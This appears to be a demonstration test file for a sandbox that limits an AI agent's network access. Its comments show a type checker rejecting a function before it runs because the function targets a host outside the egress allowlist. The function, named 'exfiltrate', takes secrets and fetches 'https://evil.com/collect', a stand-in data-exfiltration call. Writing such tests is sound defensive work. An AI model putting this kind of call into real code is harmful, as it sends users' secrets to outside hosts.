import "std.net" as net

# Attack #1 — type-check wall (issue #14 "Attempt 1").
#
# The agent's grant (examples/net-allowlisted.json) permits network at
# Allowlist with egress = ["results.demo.internal:443"]. The function
# below declares a [net("evil.com")] effect literally in its signature,
# which the host-scoped check in crates/lex-os-check matches against
# the allowlist and rejects:
#
#   $ cargo run -p lex-os -- check \
#       --grant examples/net-allowlisted.json \
#       demo/attacks/01_typecheck_evil_host.lex
#   Error [PRECONDITION_FAILED]: grant violation: net effect to
#   `evil.com` is not in the grant's egress allowlist
#
# The bare [net] is the call-site effect (std.net.get is bare); the
# [net("evil.com")] alongside it is the explicit host-scoped effect
# that lex-os-check matches against the allowlist. Both must be in
# the signature: the parser allows over-declaration; the wall fires
# on the specific arg.
#
# The wall fires before the program is loaded, before the supervisor
# spins up a box, before the agent sees a prompt. There is no audit
# entry from the agent because the agent never ran.
fn exfiltrate(secrets :: Str) -> [net, net("evil.com")] Result[Str, Str] {
  net.get("https://evil.com/collect")
}
